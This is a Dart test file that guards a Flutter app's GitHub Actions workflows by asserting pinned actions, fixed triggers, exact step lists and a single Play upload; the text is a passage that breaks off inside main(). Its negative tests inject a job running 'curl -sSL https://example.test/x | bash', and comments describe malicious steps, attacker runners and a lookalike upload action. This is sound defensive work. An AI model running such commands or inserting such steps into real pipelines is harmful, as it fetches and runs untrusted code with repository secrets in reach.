@Tags(['guard'])
library;

// Guard for #18: every action in every workflow is pinned, every workflow
// declares its permissions and its concurrency, and the two files that state
// the Flutter version agree.
//
// Why a guard rather than review: an unpinned action is a third party that can
// change between the run that went green and the run that ships, inside the
// merge gate. The plugin's own lessons name this as the failure that has
// bitten before, and "we will remember to pin" is not a control.
//
// What this does NOT cover: whether a pinned major is current — that is
// Dependabot's job, which is why the `github-actions` ecosystem is asserted
// here too. Nor whether the required-status-check context string matches the
// job name; that lives in the repository ruleset and is recorded on the issue.
import 'dart:convert';
import 'dart:io';

import 'package:flutter_test/flutter_test.dart';

import 'repo_files.dart';
import 'workflow_rules.dart';
import 'workflow_yaml.dart';

const _workflowDir = '.github/workflows';

List<String> _workflowFiles() {
  final dir = Directory('${repoRoot.path}/$_workflowDir');
  if (!dir.existsSync()) return const [];
  return dir
      .listSync() // top level only, deliberately: nothing nested runs
      .whereType<File>()
      .map((f) => f.path.substring(repoRoot.path.length + 1))
      .where((p) => p.endsWith('.yml') || p.endsWith('.yaml'))
      .toList()
    ..sort();
}

/// A minimal, valid workflow around [steps].
///
/// The rules parse now, so a fixture must be a real document rather than a
/// loose fragment — which is the point: a fragment could never have exercised
/// a flow mapping, an anchor or a second job.
String _workflow(String steps) =>
    'name: Fixture\n'
    'on: workflow_dispatch\n'
    'permissions:\n'
    '  contents: read\n'
    'concurrency: fixture\n'
    'jobs:\n'
    '  a:\n'
    '    runs-on: ubuntu-latest\n'
    '    steps:\n'
    '$steps';

/// One step whose `run:` is [script], as a block scalar.
String _runStep(String script) {
  final indented = script.split('\n').map((l) => '          $l').join('\n');
  return '      - run: |\n$indented\n';
}

/// Every structural property #20's criteria depend on, as one function so
/// the negative test below can run it against a mutated workflow and
/// require it to fail. An assertion with no proof that it can fail is what
/// #154 was.
/// The command a step runs, as one line, or null when it runs none.
///
/// `contains` was the wrong question: appending `|| true` keeps the substring,
/// so `tools/gate.sh || true` satisfied an assertion whose whole point was
/// that CI obeys the gate (#167). A step whose job is "run this and let it
/// decide" has exactly one correct body, so the assertion is equality.
String? _soleCommand(WorkflowStep? step) {
  final run = step?.run;
  if (run == null) return null;
  final lines = run
      .split('\n')
      .map((l) => l.trim())
      .where((l) => l.isNotEmpty && !l.startsWith('#'))
      .toList();
  return lines.length == 1 ? lines.single : null;
}

/// [step] must run exactly [command] — no `|| true`, no second line, no
/// trailing conjunction that could swallow its exit status.
void _expectRunsExactly(WorkflowStep? step, String command, String why) {
  expect(step, isNotNull, reason: '$why: the step is gone');
  expect(
    _soleCommand(step),
    command,
    reason:
        '$why must run `$command` and nothing else, so that its exit '
        'status is the step\'s. Found: ${step!.run?.replaceAll('\n', ' ⏎ ')}',
  );
}

/// No job anywhere runs on someone else's machine, or in a deployment
/// environment carrying its own secrets and reviewers.
///
/// Asserted in `_assertReleaseShape` only, so `runs-on: attacker-self-hosted`
/// on ci.yml's gate job was green — and ci.yml is `workflow_call`ed with
/// `secrets: inherit` (#197).
void _assertRunnerAndEnvironment(Workflow wf) {
  for (final job in wf.jobs) {
    if (job.uses != null) continue;
    expect(
      job.runsOn,
      'ubuntu-latest',
      reason:
          '${wf.path}: job `${job.name}` runs on `${job.runsOn}`. A '
          'self-hosted runner would see every secret this workflow holds',
    );
    expect(
      job.environment,
      isNull,
      reason:
          '${wf.path}: job `${job.name}` declares environment '
          '`${job.environment}`, which carries its own secrets and reviewers',
    );
  }
}

/// Every Play upload in a workflow, as `job.step`.
///
/// The "exactly one upload in the whole file" rule lived only in
/// _assertReleaseShape, so the class #169 closed was open one file over:
/// release.yml's gate job is `uses: ./.github/workflows/ci.yml` with
/// `secrets: inherit`, which puts PLAY_SERVICE_ACCOUNT_JSON in scope inside
/// ci.yml on a tag push — and an upload step added there was green (#182).
List<String> _playUploads(Workflow wf) => [
  for (final job in wf.jobs)
    for (final step in job.steps)
      if (_isPlayUpload(step)) '${job.name}.${step.id ?? step.index}',
];

/// No workflow but release.yml may talk to Play at all.
void _expectNoPlayUpload(Workflow wf) {
  expect(
    _playUploads(wf),
    isEmpty,
    reason:
        'upload-scope: ${wf.path} contains a Play upload step. Only '
        'release.yml may upload, and only from `ship`. This file runs with '
        'the same secrets — ci.yml through `secrets: inherit` on a tag push',
  );
}

/// Everything #18's criteria depend on in ci.yml. A function, not an
/// inline test, so the negative battery below can run it against a
/// mutated file — the release side had that and this did not (#170).
void _assertCiShape(Workflow ci) {
  expect(ci.problem, isNull);
  // Equality, not containsAll. `containsAll` is one-directional: it says
  // the expected triggers are present and nothing about what was added
  // beside them, so `pull_request_target` — which runs fork code in the
  // BASE repository's context, with its secrets — was green (#170).
  // release.yml already asserted its trigger by equality, so the right
  // form was available and the weaker one was chosen here.
  expect(
    ci.triggers..sort(),
    ['pull_request', 'workflow_call'],
    reason:
        'ci-shape: exactly these triggers. pull_request_target would run '
        'a fork\'s code against this repository\'s secrets',
  );
  expect(ci.jobs.map((j) => j.name).toList(), [
    'gate',
    'mutations',
  ], reason: 'ci-shape: exactly these jobs — another one can run anything');
  _expectRunsExactly(
    ci.job('mutations')!.stepById('mutations'),
    'tools/mutation_check.py',
    'ci-shape: the mutation battery must actually run',
  );
  _expectNoPlayUpload(ci);
  _assertRunnerAndEnvironment(ci);

  // Same inversion as release.yml, and the same reason: `continue-on-error`
  // on `shellcheck` was green because only three steps were checked (#197).
  // `artifact` is the one legitimate exception: it uploads the PR bundle and
  // must NOT run when release.yml calls this workflow on a tag. Named, so a
  // second exception is a deliberate edit rather than a silence.
  const ciMayBeConditional = {'artifact'};
  for (final job in ci.jobs) {
    for (final step in job.steps) {
      if (ciMayBeConditional.contains(step.id)) {
        expect(
          step.ifExpression,
          "github.event_name == 'pull_request'",
          reason:
              'ci-shape: `${step.id}` may be conditional only on being a '
              'pull request — that is why it is exempt',
        );
        expect(step.continueOnError, isFalse);
        continue;
      }
      expect(
        step.isUnconditional,
        isTrue,
        reason:
            'ci-shape: step `${step.id ?? step.index}` of `${job.name}` is '
            'conditional (if: ${step.ifExpression}, continue-on-error: '
            '${step.continueOnError}) — nothing in the gate may be skippable',
      );
    }
  }

  // The step SET, not just three ids and two indexes. An added
  // `run: curl -sSL … | bash` in the gate job was invisible, and so was a
  // full Play upload (#182).
  expect(
    ci.job('gate')!.steps.map((s) => s.id).toList(),
    [
      'checkout',
      'shellcheck',
      'java',
      'flutter',
      'deps',
      'guards',
      'gate',
      'artifact',
    ],
    reason:
        'ci-shape: exactly these steps in this order — an added step in the '
        'gate job runs with whatever secrets the caller inherited',
  );
  expect(ci.job('mutations')!.steps.map((s) => s.id).toList(), [
    'checkout',
    'java',
    'flutter',
    'deps',
    'mutations',
  ], reason: 'ci-shape: exactly these steps in the mutations job');
  for (final job in ci.jobs) {
    // `if: false` on the gate JOB disabled the entire merge gate with the
    // suite green — and `gate` is the repository's one required status
    // check, which a skipped job does not block. Every criterion below is
    // about the steps of a job nothing required to run. _assertReleaseShape
    // already asserted this for `ship`, so the right form was in the same
    // file and the weaker one was used (#189).
    expect(
      job.ifExpression,
      isNull,
      reason:
          'ci-shape: job `${job.name}` carries `if: ${job.ifExpression}`. A '
          'skipped job reports as skipped, and a skipped required check does '
          'not block a merge',
    );
    expect(
      job.continueOnError,
      isFalse,
      reason:
          'ci-shape: job `${job.name}` carries `continue-on-error`, so '
          'its failure would not block the merge it exists to block',
    );
  }

  final gate = ci.job('gate');
  expect(gate, isNotNull, reason: 'ci-shape: no gate job');
  final ids = gate!.steps.map((s) => s.id).toList();
  expect(ids.first, 'checkout');
  // Never compared to anything: `./does-not-exist` makes Shellcheck scan
  // nothing and still pass, and `severity: error` silently stops it
  // reporting warnings (#170).
  final shellcheck = gate.stepById('shellcheck')!;
  expect(shellcheck.uses, 'ludeeus/action-shellcheck@2.0.0');
  expect(
    shellcheck.with_['scandir'],
    './tools',
    reason: 'ci-shape: Shellcheck must scan the scripts directory',
  );
  expect(
    shellcheck.with_['severity'],
    'warning',
    reason: 'ci-shape: raising the severity floor hides findings',
  );
  expect(
    ids.indexOf('shellcheck'),
    1,
    reason:
        'ci-shape: Shellcheck runs before the toolchain — it takes '
        'seconds and a shell error should not wait for Gradle',
  );

  _expectRunsExactly(
    gate.stepById('deps'),
    'flutter pub get --enforce-lockfile',
    'ci-shape: dependencies must resolve against the lockfile',
  );
  _expectRunsExactly(
    gate.stepById('guards'),
    'flutter test --no-pub --tags guard',
    'ci-shape: the invariant guards must be their own step',
  );
  _expectRunsExactly(
    gate.stepById('gate'),
    'tools/gate.sh',
    'ci-shape: the gate step must run the same script as local',
  );

  for (final id in const ['deps', 'guards', 'gate']) {
    expect(
      gate.stepById(id)!.isUnconditional,
      isTrue,
      reason: 'ci-shape: `$id` must not be skippable',
    );
  }

  final artifact = gate.steps.firstWhere(
    (s) => (s.uses ?? '').contains('upload-artifact'),
  );
  expect(artifact.with_['retention-days'], '7');
  expect(artifact.with_['if-no-files-found'], 'error');
}

/// Lines that end a command's exit status rather than letting it fail.
///
/// `|| true` appended to a step's last command makes the step green whatever
/// the command did. #167 converted six assertions to equality, which catches
/// this for single-command steps; a multi-line body needs a different check,
/// and `keystore_check` and `build` had none at all (#189).
///
/// A trailing `|| true` on a cleanup line inside a longer script is often
/// deliberate, so this looks only at lines running a project tool or keytool
/// — the commands whose failure is the point of the step.
List<String> _swallowsFailure(String body) {
  // Join backslash continuations FIRST. Without this the scan has the defect
  // it is checking for: `keytool ... \` on one line and `-alias ... || true`
  // on the next are different lines (#183, #189).
  final joined = body.replaceAll(RegExp(r'\\\n\s*'), ' ');
  final offenders = <String>[];
  for (final raw in joined.split('\n')) {
    // Comments stripped. `|| true # tolerate a wrong alias` reinstated the
    // defect outright, because this helper never stripped them — while the
    // sibling rule twenty lines away has had `_stripComment` all along
    // (#197).
    final line = raw.split('#').first.trim();
    if (line.isEmpty) continue;

    // `set +e` disarms the whole body, so it is its own offence rather than
    // something to look for at the end of a line (#197).
    if (RegExp(r'(^|[;&|(]\s*)set\s+\+[a-z]*e').hasMatch(line)) {
      offenders.add(line);
      continue;
    }

    // `gh` was missing, and `gh release upload` is the entire point of the
    // `asset` step — the step #138's fix exists for (#197).
    final runsSomething = RegExp(
      r'(^|\s)(tools/\S+|keytool|flutter|gh|base64|sha256sum|curl|unzip)\b',
    ).hasMatch(line);
    if (!runsSomething) continue;

    // Every spelling of "and do not fail", not one. `|| true` was the only
    // form matched, so `|| :`, `|| /bin/true`, `|| exit 0` and a trailing
    // semicolon all walked past (#197).
    if (RegExp(r'\|\|\s*(true|:|/bin/true|/usr/bin/true|exit\s+0)\s*;?\s*$')
        .hasMatch(line)) {
      offenders.add(line);
    }
  }
  return offenders;
}

/// The command each workflow step's success depends on.
///
/// Top level because two tests need it: `a step fails when the command it
/// runs fails` executes against it, and `every declared key link is actually
/// wired` asserts each link a story promised is covered by that execution.
const _dependsOn = <String, Map<String, Map<String, List<String>>>>{
  '.github/workflows/ci.yml': {
    'gate': {
      'deps': ['flutter'],
      'guards': ['flutter'],
      'gate': ['tools/gate.sh'],
    },
    'mutations': {
      'deps': ['flutter'],
      'mutations': ['tools/mutation_check.py'],
    },
  },
  '.github/workflows/release.yml': {
    'ship': {
      'secrets_present': [],
      'version': ['tools/ci_version.sh'],
      'deps': ['flutter'],
      'keystore': ['base64'],
      'keystore_check': ['keytool'],
      'build': ['flutter'],
      'scan': ['tools/check_aab.sh'],
      'cert': ['tools/verify_upload_cert.sh'],
      'sidecar': ['sha256sum'],
      'asset': ['gh'],
      'summary': [],
      'name_failure': [],
      'shred': [],
    },
    'report-gate-failure': {'say': []},
  },
  '.github/workflows/play-promote.yml': {
    'promote': {
      'refuse': [],
      'token': ['gcloud'],
      'promote': ['tools/play_promote.sh'],
      'summary': [],
      'forget': [],
    },
  },
  '.github/workflows/play-api-check.yml': {
    'check': {
      'play': ['gcloud'],
      'keystore': ['keytool'],
      'forget': [],
    },
  },
};

/// Every command any step in any workflow is exercised against.
///
/// Shared so a test that runs a body for a reason other than propagation —
/// asking what it published, or whether it removed a credential — stubs the
/// same set and does not quietly diverge from it.
final Set<String> _ambientCommands = {
  for (final jobs in _dependsOn.values)
    for (final steps in jobs.values)
      for (final commands in steps.values) ...commands,
};

/// Every command any step of [workflow] is exercised against.
Set<String> _propagationCommands(String workflow) => {
  for (final steps in (_dependsOn[workflow] ?? const {}).values)
    for (final commands in steps.values) ...commands,
};

/// True for the 403 GitHub returns when a caller has run out of requests.
///
/// A predicate rather than an inline condition because the branch it guards
/// is hard to reach on demand — the limit resets hourly — and an untested
/// branch is exactly what #219 is about. Its own test feeds it a recorded
/// response body, so the string match is falsifiable without waiting for a
/// real 403.
bool _isRateLimited(String status, String payload) {
  if (status != '403') return false;
  final body = payload.toLowerCase();
  return body.contains('rate limit') || body.contains('secondary rate');
}

/// Runs a workflow step's `run:` body the way the runner would.
///
/// Every command in [ambient] is stubbed; the one named by [failing] exits 1
/// and the rest exit 0. With no [failing] the body should SUCCEED, and that
/// direction is the point: an assertion that a step fails when its command
/// fails is worthless if the step fails whatever happens (#204).
///
/// Two fidelity details the first version got wrong, both of which made a
/// step unable to pass:
///
///  * **`${{ … }}` is expanded before bash ever sees the body.** Left in
///    place it is a bad substitution, and `set -u` aborts the script at the
///    first one — before the command under test is reached. `build` was
///    asserted for nothing because of this.
///  * **The workspace has the files the body opens.** A redirect into a
///    directory that does not exist fails for a reason that has nothing to
///    do with the command being tested (`sidecar`).
({int code, String out, String err, String wrote, Directory workspace})
_runStepBody(
  String body, {
  required Iterable<String> ambient,
  String? failing,
  Map<String, String> extraEnv = const {},
  bool keepWorkspace = false,
}) {
  final dir = Directory.systemTemp.createTempSync('hs-stepbody');
  try {
    final bin = Directory('${dir.path}/bin')..createSync(recursive: true);

    void stub(String command) {
      final fails = command == failing;
      // A succeeding stub writes a byte, because several bodies redirect a
      // command's output to a file and then check the file is non-empty
      // (`keystore` does exactly that). A silent `exit 0` leaves an empty
      // file, so the step fails for want of output rather than for anything
      // the test is asking about — vacuity by a different route.
      //
      // `curl` gets a real one. The Play steps read its `-w '%{http_code}'`
      // and the file it writes with `-o`, and a stub that printed a fixed
      // word made every one of them exit at the status check — again
      // unable to pass whatever the body did.
      const curlStub = '''
#!/bin/sh
out=""
prev=""
for arg in "\$@"; do
  [ "\$prev" = "-o" ] && out="\$arg"
  prev="\$arg"
done
[ -n "\$out" ] && printf '{"id":"stub-edit","track":"internal","releases":[]}' > "\$out"
printf '200'
exit 0
''';
      final String script;
      if (fails) {
        script = '#!/bin/sh\necho "\$command: simulated failure" >&2\nexit 1\n';
      } else if (command == 'curl') {
        script = curlStub;
      } else if (command == 'keytool') {
        // Both fingerprints a body compares come from keytool — one from the
        // keystore listing, one from `-printcert` on the committed PEM — so
        // one constant listing makes a correct step pass. Nothing is faked
        // that the step is asserting: whether those two AGREE is the step's
        // own logic, exercised for real by play-api-check; what is asked
        // here is only whether keytool's failure reaches the step.
        script =
            '#!/bin/sh\n'
            'echo "Alias name: \${HS_KEY_ALIAS:-upload}"\n'
            'echo "SHA256: AA:BB:CC:DD:EE:FF"\n'
            'exit 0\n';
      } else {
        script = '#!/bin/sh\necho "stub output for \$command"\nexit 0\n';
      }
      File('${bin.path}/${command.split('/').last}').writeAsStringSync(script);
      Process.runSync('chmod', [
        '+x',
        '${bin.path}/${command.split('/').last}',
      ]);
      // A project script is invoked by path, so shadow it there too.
      if (command.contains('/')) {
        final asPath = File('${dir.path}/$command');
        asPath.parent.createSync(recursive: true);
        asPath.writeAsStringSync(script);
        Process.runSync('chmod', ['+x', asPath.path]);
      }
    }

    for (final command in ambient) {
      stub(command);
    }
    // Not in any `dependsOn` list, but bodies call them and the host may not
    // have them (`sha256sum` is absent on macOS), which would make a result
    // depend on who ran the suite.
    for (final command in const ['sha256sum', 'unzip', 'curl']) {
      if (!ambient.contains(command)) stub(command);
    }

    final runnerTemp = Directory('${dir.path}/runner')..createSync();
    File('${runnerTemp.path}/upload.keystore').writeAsStringSync('x');
    File('${dir.path}/build/app/outputs/bundle/release/app-release.aab')
      ..createSync(recursive: true)
      ..writeAsStringSync('bundle');

    // What the runner substitutes before the shell starts. The value is a
    // plain word so the body stays valid shell; what each expression would
    // really hold is asserted by the tests that pin the `env:` blocks.
    final expanded = body.replaceAll(
      RegExp(r'\$\{\{[^}]*\}\}'),
      'workflow-expression',
    );

    final script = File('${dir.path}/step.sh')..writeAsStringSync(expanded);
    final r = Process.runSync(
      '/bin/bash',
      [script.path],
      workingDirectory: dir.path,
      includeParentEnvironment: false,
      environment: {
        'PATH': '${bin.path}:/usr/bin:/bin',
        'RUNNER_TEMP': runnerTemp.path,
        'GITHUB_OUTPUT': '${dir.path}/out',
        'GITHUB_ENV': '${dir.path}/env',
        'GITHUB_PATH': '${dir.path}/path',
        'GITHUB_WORKSPACE': dir.path,
        'GITHUB_STEP_SUMMARY': '${dir.path}/summary',
        'GITHUB_REF_NAME': 'v1.2.3',
        'GITHUB_RUN_NUMBER': '7',
        'GITHUB_RUN_ATTEMPT': '1',
        'HS_KEYSTORE_B64': 'eA==',
        'HS_KEYSTORE_PASS': 'PROPAGATE-PASS-1',
        'HS_KEY_ALIAS': 'upload',
        'HS_KEY_PASS': 'PROPAGATE-PASS-1',
        // The play workflows' steps read these. A body that aborts on an
        // unbound variable under `set -u` cannot pass, and a step that
        // cannot pass makes its propagation check unfalsifiable.
        'PLAY_SERVICE_ACCOUNT_JSON': '{"type":"service_account"}',
        'PLAY_TOKEN': 'PROPAGATE-TOKEN-1',
        'PACKAGE': 'com.honestarcade.sudoku',
        'FROM_TRACK': 'internal',
        'TO_TRACK': 'alpha',
        'PROMOTE_OUTCOME': 'success',
        ...extraEnv,
      },
      stdoutEncoding: utf8,
      stderrEncoding: utf8,
    );
    // Everything the body WROTE, not only what it returned. A step's exit
    // code says nothing about what it published, and #215 is a step that
    // exits 0 and puts the signing keystore in the run summary.
    final wrote = StringBuffer();
    for (final entity in dir.listSync(recursive: true)) {
      if (entity is! File) continue;
      if (entity.path.startsWith('${bin.path}/')) continue;
      if (entity.path == script.path) continue;
      try {
        wrote.writeln(entity.readAsStringSync());
      } catch (_) {
        // A binary the body produced; not a channel prose can hide in.
      }
    }

    return (
      code: r.exitCode,
      out: r.stdout.toString(),
      err: r.stderr.toString(),
      wrote: wrote.toString(),
      workspace: dir,
    );
  } finally {
    if (!keepWorkspace) dir.deleteSync(recursive: true);
  }
}

/// What an inserted step in this job would have access to.
///
/// The shared reason string used to name `promote`'s Play token whatever job
/// it was reporting on, which reads as a copy-paste in a failure message that
/// is supposed to tell you what is at stake (#209).
String _jobHolds(String path, String job) {
  if (job == 'promote') return 'a live Play token';
  if (job == 'check') return 'the service-account key and the keystore';
  if (job == 'ship') return 'the signing keystore and every release secret';
  if (job == 'report-gate-failure') {
    return 'every workflow-level secret, on every failed gate';
  }
  return 'that job\'s secrets';
}

/// A step that hands the service-account key to a Play upload action.
/// Matched on the action's repository path rather than a substring of the
/// whole `uses:`, so a lookalike under another owner is not this (#169).
bool _isPlayUpload(WorkflowStep step) {
  final uses = step.uses;
  if (uses == null) return false;
  final path = uses.split('@').first;
  return path.endsWith('/upload-google-play') ||
      step.with_.containsKey('serviceAccountJsonPlainText');
}

void _assertReleaseShape(Workflow wf) {
  expect(wf.problem, isNull);

  // Only a version tag may start it. `branches: [main]` would ship on
  // every merge.
  expect(wf.triggers, ['push'], reason: 'release-shape: triggers');
  expect(wf.pushTags, [
    'v*',
  ], reason: 'release-shape: only a version tag ships');
  expect(
    wf.pushBranches,
    isEmpty,
    reason: 'release-shape: a branch filter would ship on every merge',
  );

  expect(
    wf.jobs.map((j) => j.name).toList(),
    ['gate', 'ship', 'report-gate-failure'],
    reason:
        'release-shape: exactly these three jobs — an added job runs with '
        'the same secrets and nothing above constrains it',
  );

  final gate = wf.job('gate');
  expect(gate, isNotNull, reason: 'release-shape: no gate job');
  expect(
    gate!.uses,
    './.github/workflows/ci.yml',
    reason:
        'release-shape: the gate must CALL the pull-request workflow, '
        'not restate or replace its steps',
  );
  expect(gate.secretsInherit, isTrue);
  expect(gate.steps, isEmpty, reason: 'release-shape: a `uses:` job');

  final ship = wf.job('ship');
  expect(ship, isNotNull);
  expect(ship!.needs, contains('gate'));
  expect(
    ship.ifExpression,
    isNull,
    reason: 'release-shape: an `if:` on ship would let it run on a red gate',
  );
  expect(wf.job('report-gate-failure')!.needs, contains('gate'));

  final ids = ship.steps.map((s) => s.id).toList();
  expect(ids.first, 'checkout');
  expect(
    ids[1],
    'secrets_present',
    reason: 'release-shape: the secrets assertion runs before any build',
  );

  // No job may be non-blocking. GitHub treats a `continue-on-error` job as
  // succeeded for everything that `needs:` it, so `continue-on-error: true`
  // on `gate` lets `ship` upload on a red gate — and every assertion about
  // `ship` above still passes (#169).
  for (final job in wf.jobs) {
    expect(
      job.continueOnError,
      isFalse,
      reason:
          'release-shape: job `${job.name}` (line ${job.line}) carries '
          '`continue-on-error`, which makes its failure non-blocking for '
          'everything that needs it',
    );
  }

  // Exactly one step in the WHOLE FILE may talk to Play, and everything that
  // proves the bundle must run before it — unconditionally. Scoping this to
  // `ship` let a second job upload to production untouched (#169).
  final playSteps = <({WorkflowJob job, WorkflowStep step})>[
    for (final job in wf.jobs)
      for (final step in job.steps)
        if (_isPlayUpload(step)) (job: job, step: step),
  ];
  expect(
    playSteps.map((p) => '${p.job.name}.${p.step.id ?? p.step.index}').toList(),
    ['ship.play'],
    reason:
        'release-shape: exactly one Play upload, in `ship` — a second one '
        'anywhere in the file can name any track it likes',
  );
  final play = playSteps.single.step;

  // The exact pin, not `contains`. `attacker/upload-google-play@v1` contains
  // the same substring and would be handed the service-account key (#169).
  expect(
    play.uses,
    'r0adkll/upload-google-play@v1',
    reason: 'release-shape: the upload action must be the pinned one',
  );
  expect(
    play.with_['track'],
    'internal',
    reason: 'release-shape: automation never touches production',
  );
  expect(play.with_['status'], 'completed');
  // Never asserted before: the upload could name another app entirely, or a
  // file the gate never scanned (#169).
  expect(
    play.with_['packageName'],
    'com.honestarcade.sudoku',
    reason: 'release-shape: the upload must name THIS package',
  );
  expect(
    play.with_['releaseFiles'],
    'build/app/outputs/bundle/release/app-release.aab',
    reason:
        'release-shape: the upload must ship the bundle the scan and the '
        'certificate check actually ran against',
  );
  expect(
    play.isUnconditional,
    isTrue,
    reason:
        'release-shape: `if:` or `continue-on-error` on the upload '
        'would ship after an earlier failure',
  );

  final playIndex = ship.steps.indexOf(play);
  for (final earlier in const [
    'secrets_present',
    'version',
    'keystore_check',
    'build',
    'scan',
    'cert',
  ]) {
    final index = ship.indexOfId(earlier);
    expect(
      index,
      inInclusiveRange(0, playIndex - 1),
      reason: 'release-shape: `$earlier` must run before the upload',
    );
    expect(
      ship.steps[index].isUnconditional,
      isTrue,
      reason:
          'release-shape: `$earlier` must be unconditional, or the '
          'upload can be reached without it',
    );
  }
  expect(ship.indexOfId('summary'), greaterThan(playIndex));

  // The step SET. Only `summary`'s index was bounded, so a step inserted
  // between `play` and `summary` that curls the bundle out was green — a
  // defect written out verbatim in #169's own body and closed without being
  // fixed (#182).
  expect(
    ship.steps.map((s) => s.id).toList(),
    [
      'checkout',
      'secrets_present',
      'version',
      'java',
      'flutter',
      'deps',
      'keystore',
      'keystore_check',
      'build',
      'scan',
      'cert',
      'sidecar',
      'artifact',
      'asset',
      'play',
      'summary',
      'name_failure',
      'shred',
    ],
    reason:
        'release-shape: exactly these steps in this order. Anything else in '
        '`ship` runs with all five secrets and the built bundle on disk',
  );

  // Modelled by #169's Fix line and read by nothing until now (#182).
  _assertRunnerAndEnvironment(wf);
  for (final job in wf.jobs) {
    if (job.uses != null) continue;
    expect(
      job.runsOn,
      'ubuntu-latest',
      reason:
          'release-shape: job `${job.name}` runs on `${job.runsOn}`. A '
          'self-hosted runner would see every secret this workflow holds',
    );
    expect(
      job.environment,
      isNull,
      reason:
          'release-shape: job `${job.name}` declares environment '
          '`${job.environment}`, which carries its own secrets and reviewers',
    );
  }

  // The steps that enforce invariant 1 and the signing identity must
  // actually run their scripts.
  _expectRunsExactly(
    ship.stepById('scan'),
    'tools/check_aab.sh',
    'release-shape: `scan` must run the permission scan',
  );
  expect(
    ship.stepById('sidecar')!.run,
    contains(r'sha256sum "$aab" > "$aab.sha256"'),
    reason:
        'release-shape: the sidecar must compute the checksum. Emptying it '
        r'(`: > "$aab.sha256"`) was green, and #198 listed pinning it (#209)',
  );
  _expectRunsExactly(
    ship.stepById('cert'),
    'tools/verify_upload_cert.sh',
    'release-shape: `cert` must run the certificate check',
  );
  // `contains`, and `|| true` keeps the substring — so #167's literal title
  // ("every `run:` assertion is a substring") was still true of this one
  // line after #167 closed. The executing tests stub keytool with exit 0, so
  // they never exercise it failing either (#189).
  final keystoreCheck = ship.stepById('keystore_check')!.run!;
  expect(
    keystoreCheck,
    contains(r'-alias "$HS_KEY_ALIAS"'),
    reason: 'release-shape: without -alias the check passes a wrong alias',
  );
  // EVERY step with a body, not four named ones. `version`'s `|| true` made
  // a malformed tag stop failing the build, and it was outside the scanned
  // set (#197).
  for (final step in ship.steps) {
    final body = step.run;
    if (body == null) continue;
    final swallowed = _swallowsFailure(body);
    expect(
      swallowed,
      isEmpty,
      reason:
          'release-shape: `${step.id ?? step.index}` discards the exit '
          'status of $swallowed — the step then reports success whatever '
          'happened inside it',
    );
  }

  // The INVERSE of the old shape. Seven steps were required to be
  // unconditional and the other nineteen could carry anything; now every
  // step must be unconditional except a named few, so a new step is safe by
  // default rather than unguarded by default (#197).
  const mayBeConditional = {'summary', 'name_failure', 'shred'};
  for (final step in ship.steps) {
    if (mayBeConditional.contains(step.id)) continue;
    expect(
      step.isUnconditional,
      isTrue,
      reason:
          'release-shape: step `${step.id ?? step.index}` is conditional '
          '(if: ${step.ifExpression}, continue-on-error: '
          '${step.continueOnError}). Only ${mayBeConditional.join(', ')} may '
          'be, and they must be reached on the failure path on purpose',
    );
  }
  expect(
    ship.stepById('shred'),
    isNotNull,
    reason: 'release-shape: the keystore must be deleted',
  );
  expect(ship.stepById('shred')!.ifExpression, 'always()');

  final artifact = ship.steps.firstWhere(
    (s) => (s.uses ?? '').contains('upload-artifact'),
  );
  expect(artifact.with_['retention-days'], '30');
  // Named by AC3 and asserted by nothing — renaming it to `bundle` was green
  // (#198). The tag in the name is how a run's artifact is identified later.
  expect(
    artifact.with_['name'],
    'honest-sudoku-signed-\${{ github.ref_name }}',
    reason: 'release-shape: the artifact name must carry the tag',
  );
}

void main() {
  group('the repository as it stands', () {
    test('there is at least one workflow', () {
      // An empty or missing directory fails rather than passing vacuously.
      // Every other test in this group iterates the list, so without this one
      // the whole file would go green the moment CI was deleted.
      expect(
        _workflowFiles(),
        isNotEmpty,
        reason:
            'no-workflows: $_workflowDir holds no .yml or .yaml file, so '
            'nothing gates a pull request',
      );
    });

    test('every action is pinned to a fixed, non-floating ref', () {
      final offenders = <String>[];
      for (final path in _workflowFiles()) {
        offenders.addAll(
          unpinnedUses(path, readFile(path)).map((o) => o.toString()),
        );
      }
      expect(offenders, isEmpty, reason: describeOffenders('pins', offenders));
    });

    test('every workflow declares its permissions and never write-all', () {
      final offenders = <String>[];
      for (final path in _workflowFiles()) {
        offenders.addAll(
          permissionOffenders(path, readFile(path)).map((o) => o.toString()),
        );
      }
      expect(
        offenders,
        isEmpty,
        reason: describeOffenders('permissions', offenders),
      );
    });

    test('every workflow declares a concurrency group', () {
      final offenders = <String>[];
      for (final path in _workflowFiles()) {
        offenders.addAll(
          concurrencyOffenders(path, readFile(path)).map((o) => o.toString()),
        );
      }
      expect(
        offenders,
        isEmpty,
        reason: describeOffenders('concurrency', offenders),
      );
    });

    test(
      'no workflow lets a secret or an untrusted value reach a run: body',
      () {
        final offenders = <String>[];
        for (final path in _workflowFiles()) {
          final text = readFile(path);
          offenders.addAll(
            secretsInRunOffenders(path, text).map((o) => o.toString()),
          );
          offenders.addAll(
            untrustedInRunOffenders(path, text).map((o) => o.toString()),
          );
          offenders.addAll(
            shellTraceOffenders(path, text).map((o) => o.toString()),
          );
        }
        expect(
          offenders,
          isEmpty,
          reason: describeOffenders('secrets', offenders),
        );
      },
    );

    test('ci.yml keeps the structure #18 depends on', () {
      // Nothing asserted the story's own workflow: the #151 assertions were
      // written for release.yml only, so changing the artifact retention,
      // dropping `--enforce-lockfile`, or deleting the guards step were all
      // green (#165).
      _assertCiShape(
        Workflow.parse(
          '.github/workflows/ci.yml',
          readFile('.github/workflows/ci.yml'),
        ),
      );
    });

    test('the ci-shape rule catches each way the gate can be widened', () {
      final text = readFile('.github/workflows/ci.yml');
      final mutations = <String, String Function(String)>{
        'pull_request_target added': (t) => t.replaceFirst(
          'on:\n  pull_request:\n',
          'on:\n  pull_request:\n  pull_request_target:\n',
        ),
        'a second job that runs anything': (t) =>
            '$t'
            '  extra:\n'
            '    runs-on: ubuntu-latest\n'
            '    steps:\n'
            '      - run: curl -sSL https://example.test/x | bash\n',
        'continue-on-error on the gate job': (t) => t.replaceFirst(
          '  gate:\n',
          '  gate:\n    continue-on-error: true\n',
        ),
        'shellcheck scans nothing': (t) =>
            t.replaceFirst('scandir: ./tools', 'scandir: ./does-not-exist'),
        'shellcheck severity raised past warnings': (t) =>
            t.replaceFirst('severity: warning', 'severity: error'),
      };
      mutations.forEach((why, mutate) {
        final mutated = mutate(text);
        expect(mutated, isNot(text), reason: 'sanity: "$why" changed nothing');
        expect(
          Workflow.parse('ci.yml', mutated).problem,
          isNull,
          reason: 'sanity: "$why" produced YAML that does not parse',
        );
        expect(
          () => _assertCiShape(Workflow.parse('ci.yml', mutated)),
          throwsA(isA<TestFailure>()),
          reason: 'ci-shape-negative: "$why" was not caught',
        );
      });
    });

